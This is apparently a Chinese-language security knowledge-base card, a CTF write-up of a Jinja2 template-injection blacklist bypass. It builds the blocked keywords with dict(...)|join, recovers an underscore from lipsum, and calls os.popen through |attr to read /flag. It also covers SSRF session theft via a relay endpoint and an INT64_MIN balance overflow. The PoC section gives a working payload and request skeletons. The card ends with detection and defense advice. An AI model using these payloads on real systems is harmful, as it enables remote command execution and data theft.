---
id: web-python-ssti-jinja2-dict-join-keyword-construction
title: Jinja2 SSTI 黑名单绕过：dict(...)|join 动态拼关键字 + lipsum split 取单字符 + attr 调用 os.popen
type: scenario
domain: web
path: web/python/ssti
technique: jinja2-ssti-dict-join-keyword-construction
tags:
- jinja2
- ssti
- python
- waf-bypass
- dict-join
- dynamic-string
- attr-filter
- lipsum
- ssrf
- integer-overflow
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V156
  verified_at: '2026-11-06T07:45:13+08:00'
  notes: 已对照原文与3张图核对：/relay SSRF取session、/hack amount=-9223372036854775808溢出、/market fragment注入、dict(...)|join拼split/generate/global/get/os/popen/read、lipsum|string按generate切分取_、lipsum|attr(__globals__)|attr(get)(os)、os.popen(cmd).read()、cmd由/usr/bin/tar+-cf+-+/flag拼接，均与原文完整payload一致；卡片对溢出方向与spc/mn派生细节如实标注需按源码/原文。未验证点：未复跑原文exp（CTF题无组件版本，未设置versions）；frontmatter无sources/source_url。
url: /docs/web/python/ssti/web-python-ssti-jinja2-dict-join-keyword-construction/
draft: false
kb_aliases:
- cybers
- dict join SSTI
- Jinja2 字典键拼接
- lipsum split 取下划线
- 动态字符串构造 SSTI
- attr 过滤器调用 popen
- SSRF relay 获取 session
- INT64_MIN 余额溢出
---

## 一句话结论

内网应用存在 Jinja2 SSTI，但黑名单拦截了 `os`、`popen`、`read`、`flag`、下划线等常见关键字；利用 `dict(s=1,p=1,l=1,i=1,t=1)|join` 让字典迭代键拼出 `split`，对 `lipsum|string` 按 `generate` 切分后取末段首字符得到 `_`，再用同样的字典拼接构造 `__globals__`、`os`、`popen`、`read` 和命令字符串，最后通过 `|attr` 动态调用 `os.popen("/usr/bin/tar -cf - /flag").read()`，即可在不出现任何黑名单字面量的情况下执行命令并回显 flag。

## 原理

- **入口链**：外部只暴露一个网关，`/relay` 接受 `port` 与 `data` 两个参数，把 `data` 原样转发到 `127.0.0.1:<port>`。这是 SSRF/原始 TCP 转发：先向 `/relay` 发 `GET /initialize` 拿到内部应用的 `session`，再把后续请求逐条转发到内部 5000 端口，从而绕过外部无法直连内网服务的限制。
- **前置条件——余额**：`/hack?amount=-9223372036854775808`（INT64_MIN，64 位有符号整数最小值）会让服务端的余额校验/扣减产生有符号溢出，余额变成一个巨大的正数，满足后续购买/SSTI 触发点的余额要求。文章没有给出服务端源码，具体是 `balance -= amount` 还是 `balance += amount` 导致的溢出未展开；关键是不要把客户端传入的 `amount` 直接参与有符号 64 位运算。
- **注入点**：`/market` 的 POST 参数 `fragment` 被拼进 Jinja2 模板；页面在“Fragment '...' not found”的错误信息里回显渲染结果，因此可以把模板表达式放在 `fragment` 中并读取输出。
- **黑名单的盲区**：过滤按原始模板文本匹配常见关键字（`os`、`popen`、`read`、`flag`、`_` 等）。Jinja2 在渲染时才求值，`dict(...)|join`、字符串拼接、`attr` 动态属性访问都能在“源码中没有连续关键字”的情况下生成等价字符串。
- **`dict(...)|join` 构造关键字**：Jinja2 的 `dict(s=1,p=1,l=1,i=1,t=1)` 生成字典；对字典迭代时默认迭代键，`|join` 把键拼成字符串，得到 `split`。同理 `dict(g=1,e=1,n=1)|join` → `gen`，`dict(e=1,r=1)|join` → `er`，`dict(a=1,t=1,e=1)|join` → `ate`，拼接得到 `generate`。这样 `generate`、`split`、`global`、`os`、`popen`、`read` 等词都不以字面量出现。
- **从 lipsum 取单字符 `_`**：`lipsum|string` 是内置函数 `generate_lorem_ipsum` 的字符串表示；`(lipsum|string)|attr("split")("generate")` 按 `generate` 切分，`|last|first` 取最后一段的第一个字符，即函数名 `generate_lorem_ipsum` 中的下划线 `_`。有了 `_`，`u+u+"global"+"s"+u+u` 就能拼出 `__globals__`，而不需要在模板里写 `__`。
- **取 os 与 popen**：`(lipsum|attr("__globals__"))|attr("get")("os")` 从 `lipsum` 函数的 globals 字典中取出 `os` 模块；`"po"+"pen"` 拼出 `popen`；`|attr(popen)` 等价于 `.popen`，动态调用。`|attr("read")()` 读取命令输出。
- **读 flag 的命令**：`/usr/bin/tar -cf - /flag` 用 tar 把 `/flag` 打包输出到 stdout，避免直接使用被拦的 `cat`/`flag` 字面量；tar 的输出里包含文件内容，页面回显即可读到 flag。
- **为什么 `attr` 关键**：Jinja2 的 `|attr(name)` 过滤器等价于 `getattr(obj, name)`，`name` 可以是变量（由字典拼接得到），因此属性名不需要以字面量形式出现在模板中；同时它也避开了点号/中括号可能触发的语法限制。

## 触发条件

- 外部可达的 `/relay` 之类转发接口：接受目标端口和原始数据，未限制只能访问白名单主机/端口，构成 SSRF/原始 TCP 转发。
- 内部应用使用 session cookie，`/initialize` 等路由会下发 `session=...`；攻击者能通过 relay 读取响应并提取。
- 余额/价格接口把客户端传入的 64 位整数直接参与有符号运算，`INT64_MIN` 可造成溢出并绕过余额检查（具体运算方向需按源码确认）。
- `/market` 等路由把用户输入拼进 Jinja2 模板（`render_template_string`/`Template().render`），且回显渲染结果或错误信息。
- Jinja2 环境未启用严格沙箱，`lipsum` 等全局函数可达 `__globals__`；`dict`、`join`、`attr` 过滤器可用。

## 利用步骤

1. 通过 `/relay` 向内部 5000 端口发送 `GET /initialize`，从响应中提取 `session=...`。
2. 用该 session 请求 `/hack?amount=-9223372036854775808`，触发有符号溢出，使余额变为巨大正数；响应可能刷新 session，重新提取。
3. 构造 Jinja2 payload：用 `dict(...)|join` 拼出 `split`、`generate`、`global`、`get`、`os`、`popen`、`read` 等词；用 `lipsum|string` 按 `generate` 切分取 `_`。
4. 拼出 `__globals__`，从 `lipsum` 取 `os`；拼出 `popen`，拼出 `/usr/bin/tar -cf - /flag`。
5. 通过 `/relay` 把 `fragment=<urlencode(payload)>` POST 到 `/market?cmd=cat%20/flag`（`cmd` 参数可能只是干扰/占位），保持 session cookie 和正确的 `Content-Length`。
6. 从响应中的 `Fragment '...' not found` 或渲染结果提取 tar 输出，得到 flag。

## PoC

关键模板骨架（完整 payload 见原文；下面是可读的等价构造）：

```jinja2
{# 用字典键拼出 split / generate / global / get / os / popen / read #}
{% set sp = dict(s=1,p=1,l=1,i=1,t=1)|join %}
{% set ge = dict(g=1,e=1,n=1)|join %}
{% set er = dict(e=1,r=1)|join %}
{% set ate = dict(a=1,t=1,e=1)|join %}
{% set gt = dict(g=1,e=1,t=1)|join %}
{% set oo = dict(o=1,s=1)|join %}
{% set rd = dict(r=1,e=1,a=1,d=1)|join %}
{% set pp = (dict(p=1,o=1)|join) + (dict(p=1,e=1,n=1)|join) %}
{% set gl = (dict(g=1,l=1,o=1,b=1,a=1)|join) + (dict(l=1,s=1)|join) %}

{# 从 lipsum 的字符串表示按 generate 切分，取末段首字符 '_' #}
{% set u = (((lipsum|string)|attr(sp)(ge+er+ate))|last)|first %}
{% set gs = u + u + gl + u + u %}                 {# __globals__ #}

{# lipsum.__globals__.get('os') #}
{% set om = (lipsum|attr(gs))|attr(gt)(oo) %}

{# os.popen('/usr/bin/tar -cf - /flag').read() #}
{# 真实 payload 中命令里的 /、空格、-、flag 也由派生字符/字典拼接得到；
   这里为可读性直接写字符串，实际使用时需按原文的 sl/usr/bin/tar/spc/mn/cf/fg 方式构造 #}
{% print((om|attr(pp)('/usr/bin/tar -cf - /flag'))|attr(rd)()) %}
```

原文命令拼接的等价关系（每个片段在真实 payload 中由派生字符或 `dict|join` 得到）：`sl='/'`、`usr='usr'`、`bin='bin'`、`tar='tar'`、`spc=' '`、`mn='-'`、`cf='cf'`、`fg='flag'`，最终 `cmd = sl+usr+sl+bin+sl+tar+spc+mn+cf+spc+mn+spc+sl+fg`。

外部请求骨架：

```python
# 1) SSRF 拿 session
send_data("GET /initialize HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
# 2) INT64_MIN 溢出
send_data(f"GET /hack?amount=-9223372036854775808 HTTP/1.1\r\nCookie: session={token}\r\n\r\n")
# 3) POST fragment=urlencode(template)
```

原文脚本在目标上完成并回显 flag；本卡不执行 PoC。`/usr/bin/tar` 路径和 `lipsum` 的字符串表示可能随环境变化，需按目标调整。

## 变体与关联

- **没有 `lipsum`**：可用 `url_for`、`get_flashed_messages`、`cycler` 等全局函数；`|string` 后按函数名中的固定片段切分，同样可以取到 `_`。
- **`dict|join` 的通用性**：任何需要构造被拦关键字的场景都可使用，例如 `dict(o=1,s=1)|join` 得 `os`；键的顺序按传入顺序迭代，注意 Python 3.7+ 字典保序。
- **其他 SSTI 绕过**：`\x5f` 十六进制下划线、`chr()` 拼接、`request.args` 拆分参数、`|attr` 替代点号；参见关联卡。
- **SSRF 变体**：`/relay` 若只允许 HTTP，可用 gopher/原始 socket 或 302 重定向扩展协议；若限制端口，可扫内网端口。
- **整数溢出变体**：`INT64_MIN`、`INT64_MAX`、`0x8000000000000000`；若后端使用无符号/浮点/Decimal，效果不同，需要按源码确认。
- 关联：[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（`\x5f`+`attr`+参数拆分）、[[web-python-ssti-getattr-chr-blacklist-bypass]]（`getattr`+`chr`）、[[web-python-ssti-jinja2-flag-keyword-chr-subclass-index-bypass]]（只过滤 flag 关键字）、[[web-generic-ssrf-preview-panel-target-url-localhost]]（SSRF 访问本机内部路由）。

## 检测与防御

- **SSTI**：不要对用户输入调用 `render_template_string`/`Template().render`；使用固定模板 + 参数化上下文；启用 `SandboxedEnvironment`，移除 `lipsum`/`cycler` 等不必要全局函数与危险过滤器。
- **WAF**：仅靠关键字黑名单不够；应对 Jinja2 语法做规范化/解析后检测，限制 `{%`、`{{`、`|attr`、`dict(` 等结构；但根本仍是消除模板注入。
- **SSRF**：`/relay` 应限制目标主机/端口白名单、禁止原始 TCP 转发、对 `data` 做协议校验；不要让外部可控的 `port` 直连 localhost。
- **整数溢出**：余额/价格使用服务端可信值，客户端 `amount` 做范围校验并使用 checked arithmetic/Decimal；不要直接参与 64 位有符号加减。
- **检测**：请求中出现 `dict(`、`|join`、`|attr`、`lipsum` 等 SSTI 特征；`amount` 为 `-9223372036854775808` 等边界值；`/relay` 的 `port` 指向内网端口；响应中出现 `/usr/bin/tar` 或 flag 格式。
- **最小权限**：Web 进程不应能直接读 `/flag`；容器内使用只读文件系统/seccomp 限制 `execve` 与 `tar`。
